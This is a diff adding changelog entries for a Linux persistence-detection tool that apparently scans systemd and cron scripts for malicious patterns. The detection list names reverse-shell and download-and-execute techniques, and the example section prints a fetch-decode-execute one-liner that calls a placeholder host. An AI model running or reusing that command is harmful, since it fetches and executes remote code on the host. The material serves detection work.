@@ -5,6 +5,74 @@ All notable changes to Persistnux will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.5.0] - 2026-01-25
+
+### Added
+- **Script Content Analysis**: Deep inspection of script files executed by persistence mechanisms
+  - New function `is_script()`: Detects if a file is a script vs binary/ELF
+  - New function `analyze_script_content()`: Reads and analyzes script content for malicious patterns
+  - Integrated into systemd service detection: analyzes scripts pointed to by ExecStart
+  - Integrated into cron job detection: analyzes cron scripts for suspicious content
+  - Detects obfuscation techniques: base64 decode, encryption, eval/exec with variables
+  - Detects reverse shell techniques: mkfifo, socat, netcat listeners, /proc/self/exe tricks
+  - Detects download-execute patterns: curl/wget command substitution, chmod +x in /tmp
+  - Detects scripting language one-liners: python -c, perl -e, ruby -e, awk system()
+
+### Security Rationale
+**Why This Matters**: Attackers often hide malicious code inside seemingly innocent scripts. Previously, Persistnux only checked the ExecStart command line itself. Now it reads and analyzes the actual script content to detect obfuscated or sophisticated attacks.
+
+**Example Attack Prevented**:
+```systemd
+# Service file: /etc/systemd/system/backup.service
+# ExecStart=/usr/local/bin/backup.sh (looks innocent)
+
+# backup.sh contains:
+#!/bin/bash
+curl -s http://evil.com/payload | base64 -d | bash
+
+# v1.4: Would be LOW/MEDIUM confidence (path looks safe, package-unmanaged)
+# v1.5: Detected as HIGH confidence (script contains curl|bash and base64 decode)
+```
+
+### Improved
+- **Higher detection accuracy**: Malicious scripts are now detected even if the ExecStart path looks innocent
+- **Fewer false negatives**: Obfuscated attacks hiding in scripts are now caught
+- **Better confidence scoring**: Scripts with suspicious content automatically get HIGH confidence
+
+## [1.4.0] - 2026-01-24
+
+### Changed
+- **Restructured CSV/JSONL Output**: More analyst-friendly format with dedicated columns
+  - Old format: cramped pipe-delimited strings in description/metadata fields
+  - New format: dedicated columns for command, file_owner, file_permissions, file_age_days, enabled_status
+  - Better Excel compatibility: easier filtering, sorting, and pivot tables
+  - Better SIEM integration: structured fields for Splunk/ELK queries
+
+### New CSV Columns
+- `timestamp`: ISO 8601 format timestamp
+- `hostname`: System hostname
+- `category`: Persistence mechanism type
+- `confidence`: LOW/MEDIUM/HIGH/CRITICAL
+- `file_path`: Full path to persistence file
+- `file_hash`: SHA256 hash
+- `file_owner`: Owner username
+- `file_permissions`: Octal permissions
+- `file_age_days`: Days since last modification
+- `package_status`: Package manager status (dpkg:package-name, rpm:package-name, or unmanaged)
+- `command`: Actual command being executed
+- `enabled_status`: For systemd services (enabled/disabled)
+- `description`: Human-readable summary
+
+### Added
+- New function `escape_json()`: Properly escapes special characters in JSONL output
+- New function `add_finding_new()`: Structured output function with dedicated parameters
+- Backward compatibility wrapper: Old `add_finding()` calls automatically converted to new format
+
+### Improved
+- **Analyst workflow**: Easier to sort by confidence, filter by owner, search by command
+- **Data analysis**: Clean columns enable SQL queries, pandas DataFrames, Excel formulas
+- **JSONL robustness**: Proper escaping prevents parsing errors from quotes/newlines in file content
+
 ## [1.3.0] - 2026-01-23
 
 ### Changed
